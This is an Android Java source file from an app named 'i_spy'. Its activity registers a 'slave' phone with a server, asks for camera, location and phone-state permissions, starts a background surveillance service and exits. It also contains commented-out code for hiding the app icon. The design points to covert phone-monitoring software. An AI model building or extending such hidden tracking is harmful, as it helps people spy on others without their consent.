package com.um.asn.i_spy;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.um.asn.i_spy.http_methods.HttpPostTask;
import com.um.asn.i_spy.services.SlaveService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.concurrent.ExecutionException;

public class RegisterSlaveActivity extends AppCompatActivity {

    public final static int REQUEST_ALL_PERM = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_register_slave);

        // Demande les permissions nécessaires
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.CAMERA, Manifest.permission.LOCATION_HARDWARE, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, }, REQUEST_ALL_PERM);

        Button registerSlaveButton = (Button) findViewById(R.id.register_slave_button);

        registerSlaveButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                /* Creation d'un objet HttpPostTask, execution de la methode
                 * doInBackground et recuperation du resultat */
                try {

                    ConnectivityManager connMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

                    NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();
                    if (networkInfo != null && networkInfo.isConnected()) {

                        String url = Config.SERVER_DOMAIN + "phones";
                        final EditText login = (EditText) findViewById(R.id.register_slave_login);
                        final EditText password = (EditText) findViewById(R.id.register_slave_password);

                        if (!login.getText().toString().equals("") && !password.getText().toString().equals("")) {

                            // Construction de l'objet json
                            JSONObject phone = new JSONObject();
                            phone.put("login", login.getText().toString());
                            phone.put("password", password.getText().toString());

                            JSONObject replyFromServer = new JSONObject((String) new HttpPostTask()
                                    .execute(new Object[]{url, phone.toString()}).get());

                            if (!((boolean) replyFromServer.get("success"))) {

                                /* Handling error message from server*/
                                String message = (String) replyFromServer.get("message");
                                int toastMessage;

                                switch (message) {
                                    case "uniqueLogin":
                                        toastMessage = R.string.message_mail_already_exists;
                                        break;
                                    default:
                                        toastMessage = R.string.message_internal_server_error;
                                        break;
                                }

                                Toast.makeText(RegisterSlaveActivity.this,
                                        toastMessage, Toast.LENGTH_LONG).show();
                            } else {

                                // le retour d'une requete select est un tableau JSON
                                JSONObject obj = (JSONObject) replyFromServer.get("data");

                                /* Ajout dans le fichier phone_info des informations du téléphone
                                   pour l'envoi de l'id et password dans les futures requetes qu'il passera
                                */
                                FileOutputStream phoneInfoStream = openFileOutput(Config.PHONE_INFO, Context.MODE_PRIVATE);
                                phoneInfoStream.write(obj.toString().getBytes());

                                // Pour cacher l'icon de l'application dans la liste des app
                                // Ferme l'app et empêche de la réouvrir...
                                // Il faut la désinstaller et réinstaller
                                /*PackageManager p = getPackageManager();
                                ComponentName componentName = new ComponentName(
                                        RegisterSlaveActivity.this,
                                        com.um.asn.i_spy.ChooseModeActivity.class
                                );
                                p.setComponentEnabledSetting(
                                        componentName,
                                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                        PackageManager.DONT_KILL_APP
                                );*/

                                // Démarre le service
                                Intent slaveService = new Intent(RegisterSlaveActivity.this, SlaveService.class);
                                startService(slaveService);

                                // Ferme l'application
                                Intent intent = new Intent(getApplicationContext(), ChooseModeActivity.class);
                                intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                intent.putExtra("EXIT", true);
                                startActivity(intent);
                            }

                        }

                    } else {
                        Toast.makeText(RegisterSlaveActivity.this, R.string.message_internet_connection_error, Toast.LENGTH_LONG).show();
                    }

                } catch (InterruptedException e) {
                    e.printStackTrace();
                } catch (ExecutionException e) {
                    e.printStackTrace();
                } catch (JSONException e) {
                    e.printStackTrace();
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {
        switch (requestCode) {
            case REQUEST_ALL_PERM: {
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    Toast.makeText(RegisterSlaveActivity.this, "PERM OK !", Toast.LENGTH_LONG).show();

                } else {

                    Toast.makeText(RegisterSlaveActivity.this, "PERM NOT OK !", Toast.LENGTH_LONG).show();
                }
                return;
            }
        }
    }
}
